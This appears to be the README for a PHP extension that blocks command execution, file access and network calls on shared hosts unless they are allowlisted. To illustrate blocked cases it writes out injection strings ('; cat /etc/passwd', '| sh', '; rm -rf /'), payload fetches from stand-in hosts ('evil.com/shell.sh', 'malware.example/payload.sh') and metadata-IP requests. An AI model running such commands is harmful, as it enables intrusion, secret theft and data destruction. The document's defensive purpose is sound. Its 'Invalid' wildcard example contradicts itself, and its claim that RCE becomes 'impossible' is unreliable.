# PHP Security Guard

> Native PHP security extension for shared hosting environments, designed to intercept sensitive PHP function calls and enforce whitelist-based policies for commands, files, URLs, domains, and explicit IP addresses.

---

### Overview

**PHP Security Guard** is a native PHP extension, compiled as a `.so` module, designed to add an additional security layer to PHP-FPM hosting environments such as **CWP**, **cPanel**, and similar Linux hosting panels.

The extension uses a `zend_execute_ex` hook to intercept sensitive PHP function calls and apply security policies based on administrator-managed whitelists.

The project is designed to be transparent to hosted websites: existing PHP applications do not need to be modified. Allowed operations continue normally, while unauthorized operations can be monitored, logged, or blocked depending on the configured enforcement mode.

---

### Main Goal

The main goal is to reduce the attack surface of shared PHP hosting environments by controlling dangerous or sensitive PHP functions such as:

```php
exec()
passthru()
shell_exec()
system()
proc_open()
popen()
curl_exec()
curl_multi_exec()
parse_ini_file()
show_source()
file_get_contents()
fopen()
readfile()
```

Instead of simply disabling all functions globally, PHP Security Guard aims to provide a more granular model based on explicit allowlists.

---

### Security Model

The extension groups monitored operations into three major categories:

```text
1. Command execution
2. Local file access
3. Network access through URLs, domains, explicit IPs, and CIDRs
```

Each category has its own whitelist configuration file:

```text
/etc/security_guard/allowed_commands.conf
/etc/security_guard/allowed_files.conf
/etc/security_guard/allowed_network.conf
```

The default security philosophy is:

```text
Deny by default.
Allow only what is explicitly authorized.
Log denied operations.
Optionally log allowed operations.
```

---

### What It Controls

#### Command Execution

Controls calls to functions such as:

```php
exec()
shell_exec()
system()
passthru()
proc_open()
popen()
```

Only explicitly whitelisted command binaries should be allowed.

Example:

```text
command|/usr/bin/optipng|2026-05-04T14:30:00-03:00|admin|PNG optimization
command|/usr/bin/jpegtran|2026-05-04T14:31:00-03:00|admin|JPEG optimization
command|/usr/bin/gifsicle|2026-05-04T14:32:00-03:00|admin|GIF optimization
```

**Protection against Command Injection (Nesting):**
Even if a binary is allowed in the whitelist (e.g., `/usr/bin/optipng`), the extension performs a strict scan across the entire command string before allowing execution. It instantly blocks any shell injection attempt using the following operators:
```text
;  &&  ||  |  >>  >  <  `  $(  ${  \n  \r
```
This renders RCE techniques impossible, such as:
- `optipng file.png ; cat /etc/passwd`
- `optipng file.png | sh`
- `optipng file.png > /var/www/html/shell.php`
- `optipng $(whoami)`

**Protection against Download + Execution:**
If an attacker uses PHP to download a malicious script (e.g., via `file_get_contents` or `curl`) and saves it to disk, they will not be able to execute it via a command (e.g., `exec('/bin/bash payload.sh')`) unless `/bin/bash` is explicitly in the whitelist. The extension intercepts the call, extracts the main binary, and refuses the execution of unauthorized binaries. If a valid binary is used, the extension rigorously logs the binary and all its arguments into the JSONL audit log.

---

#### Local File Access

Controls sensitive file-reading operations such as:

```php
parse_ini_file()
show_source()
highlight_file()
file_get_contents()
fopen()
readfile()
```

Only explicit absolute paths should be allowed.

Example:

```text
file|/home/example/public_html/wp-content/uploads|2026-05-04T14:40:00-03:00|admin|WordPress uploads
file|/etc/ssl/certs/ca-bundle.crt|2026-05-04T14:42:00-03:00|admin|CA bundle
```

---

#### Network Access

Controls network calls performed through functions such as:

```php
curl_exec()
curl_multi_exec()
file_get_contents()
fopen()
fsockopen()
pfsockopen()
stream_socket_client()
```

Allowed network entries may include:

```text
domain
url
ip
cidr
```

Example:

```text
domain|api.mercadopago.com|2026-05-04T15:00:00-03:00|admin|Payment gateway
domain|example.com|2026-05-04T15:01:00-03:00|admin|Base domain
domain|*.example.com|2026-05-04T15:02:00-03:00|admin|Allowed subdomains
url|https://api.example.com/v1/payments|2026-05-04T15:03:00-03:00|admin|Specific endpoint
ip|127.0.0.1|2026-05-04T15:04:00-03:00|admin|Explicit local service
cidr|192.168.0.0/24|2026-05-04T15:05:00-03:00|admin|Explicit internal range
```

Important: this extension does **not** resolve DNS. Domain validation is applied to the textual host in the URL. IP rules apply only when the URL or connection uses an explicit IP address, for example:

```text
https://127.0.0.1/
http://192.168.0.10/api
```

---

### Wildcard Subdomains

Wildcard subdomains are supported with validation rules.

Valid:

```text
domain|example.com|2026-05-04T15:01:00-03:00|admin|Base domain
domain|*.example.com|2026-05-04T15:02:00-03:00|admin|Subdomains
```

Invalid:

```text
domain|*.example.com|2026-05-04T15:02:00-03:00|admin|Subdomains
```

A wildcard entry must not exist without its base domain.

---

### PHP INI Configuration

Example configuration:

```ini
extension=security_guard.so

security_guard.enabled=1
; Modes: off, monitor, block
security_guard.enforcement_mode=monitor

security_guard.allowed_commands_file=/etc/security_guard/allowed_commands.conf
security_guard.allowed_files_file=/etc/security_guard/allowed_files.conf
security_guard.allowed_network_file=/etc/security_guard/allowed_network.conf

security_guard.log_allowed=0
security_guard.log_denied=1
security_guard.log_scope=per_user
security_guard.log_path=/var/log/security_guard

security_guard.allow_wildcard_domains=1
security_guard.require_base_domain_for_wildcard=1
security_guard.block_private_networks=1
security_guard.explicit_allow_overrides_private_block=1
security_guard.block_metadata_endpoints=1
security_guard.emit_php_warning=1
security_guard.config_reload_interval=60
security_guard.log_format=jsonl
```

---

### Practical Examples & Expected Results

Below are some scenarios based on an example configuration.

**Whitelist Configuration:**
- Allowed commands: `/usr/bin/optipng`
- Allowed networks: `api.mercadopago.com` (domain)

#### Command Scenarios

| PHP Code | Resulting Call | Expected Result | Reason for Block |
|----------|----------------|-----------------|------------------|
| `exec('optipng img.png');` | `optipng` (no absolute path) | ❌ **Blocked** | Path is not absolute or binary not in whitelist. |
| `exec('/usr/bin/optipng img.png');` | `/usr/bin/optipng img.png` | ✅ **Allowed** | Binary is in whitelist and has no dangerous operators. |
| `exec('/usr/bin/optipng img.png ; rm -rf /');` | `/usr/bin/optipng img.png ; rm -rf /` | ❌ **Blocked** | Dangerous operator (`;`) present. Prevents injection. |
| `exec('/bin/bash payload.sh');` | `/bin/bash payload.sh` | ❌ **Blocked** | The `/bin/bash` binary is not explicitly authorized. |

#### Network Scenarios

| PHP Code | Resulting Call | Expected Result | Reason for Block |
|----------|----------------|-----------------|------------------|
| `file_get_contents('https://api.mercadopago.com/v1/');` | Domain `api.mercadopago.com` | ✅ **Allowed** | Domain is in the network whitelist. |
| `curl_exec()` on `http://evil.com/shell.sh` | Domain `evil.com` | ❌ **Blocked** | Domain not listed in whitelist. |
| `fopen('http://169.254.169.254/', 'r');` | IP `169.254.169.254` | ❌ **Blocked** | Cloud metadata IP blocked natively (SSRF protection). |
| `file_get_contents('http://127.0.0.1/admin');` | IP `127.0.0.1` | ❌ **Blocked** | Private networks blocked natively (SSRF protection). |

*(Note: When blocked in `block` mode, the function will return `false` or `null`, and a security `PHP Warning` will be emitted into the native PHP error logs).*

---

### Enforcement Modes

```text
off      Extension loaded but not enforcing or monitoring
monitor  Detect and log violations without blocking
block    Block unauthorized calls
```

Recommended rollout:

```text
1. Start in monitor mode.
2. Review denied logs.
3. Build whitelists.
4. Enable block mode after validation.
```

---

### Logging

PHP Security Guard supports structured JSONL logs.

Example denied command log:

```json
{"ts":"2026-05-04T15:32:00-03:00","action":"deny","group":"command","function":"shell_exec","user":"client1","uid":1005,"script":"/home/client1/public_html/wp-content/plugins/x/a.php","target":"wget http://malware.example/payload.sh","reason":"command_not_whitelisted","mode":"block"}
```

Example denied network log:

```json
{"ts":"2026-05-04T15:31:00-03:00","action":"deny","group":"network","function":"file_get_contents","user":"client1","uid":1005,"script":"/home/client1/public_html/test.php","target":"http://127.0.0.1:8080/admin","scheme":"http","host":"127.0.0.1","port":8080,"host_type":"ip","reason":"ip_not_whitelisted","mode":"block"}
```

Logs may be global or separated by Linux/PHP-FPM user.

---

### CWP Plugin

The project also includes a ready-to-use **CWP admin plugin** to manage whitelists directly from the panel.

The plugin provides a graphical interface to:

```text
- Add, remove, and list allowed commands
- Add, remove, and list allowed files/directories
- Add, remove, and list allowed domains, URLs, IPs, and CIDRs
```

You can install it automatically using the `install.sh` script or by following the instructions in `INSTALL.md`.

---

### Security Notice

PHP Security Guard is an additional hardening layer. It does not replace:

```text
Linux user isolation
PHP-FPM pools per user
Correct file permissions
open_basedir
Outbound firewall rules
ModSecurity/WAF
Malware scanning
Backups
CMS/plugin updates
```

The extension validates what PHP code tries to execute or access. It should be used together with operating system and hosting-panel security controls.

---

### License

Recommended license:

```text
Apache-2.0
```
